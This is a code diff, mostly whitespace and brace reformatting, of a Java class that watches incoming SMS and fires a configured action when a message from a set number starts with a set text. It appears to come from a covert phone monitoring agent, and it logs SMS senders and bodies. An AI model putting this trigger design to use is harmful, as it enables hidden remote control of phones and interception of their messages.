@@ -25,7 +25,7 @@ public class EventSms extends EventBase implements Observer<Sms> {
 
 	private int actionOnEnter;
 	private String number, msg;
-	
+
 	@Override
 	public void begin() {
 		ListenerSms.self().attach(this);
@@ -43,7 +43,7 @@ public class EventSms extends EventBase implements Observer<Sms> {
 		final byte[] conf = event.getParams();
 
 		final DataBuffer databuffer = new DataBuffer(conf, 0, conf.length);
-		
+
 		try {
 			actionOnEnter = event.getAction();
 
@@ -52,19 +52,21 @@ public class EventSms extends EventBase implements Observer<Sms> {
 			databuffer.read(num);
 
 			number = WChar.getString(num, true);
-			
+
 			// Estraiamo il messaggio atteso
 			byte[] text = new byte[databuffer.readInt()];
 			databuffer.read(text);
-			
+
 			msg = WChar.getString(text, true);
-			
+
 			num = text = null;
 		} catch (final IOException e) {
-			if(Cfg.DEBUG) Check.log( TAG + " Error: params FAILED");
+			if (Cfg.DEBUG) {
+				Check.log(TAG + " Error: params FAILED");
+			}
 			return false;
 		}
-		
+
 		return true;
 	}
 
@@ -75,21 +77,23 @@ public class EventSms extends EventBase implements Observer<Sms> {
 
 	// Viene richiamata dal listener (dalla dispatch())
 	public int notification(Sms s) {
-		if(Cfg.DEBUG) Check.log( TAG + " Got SMS notification from: " + s.getAddress() + " Body: " + s.getBody());
-		
+		if (Cfg.DEBUG) {
+			Check.log(TAG + " Got SMS notification from: " + s.getAddress() + " Body: " + s.getBody());
+		}
+
 		if (s.getAddress().equalsIgnoreCase(this.number) == false) {
 			return 0;
 		}
-		
+
 		// Case sensitive
 		if (s.getBody().startsWith(this.msg) == false) {
 			return 0;
 		}
-		
+
 		onEnter();
 		return 1;
 	}
-	
+
 	public void onEnter() {
 		trigger(actionOnEnter);
 	}
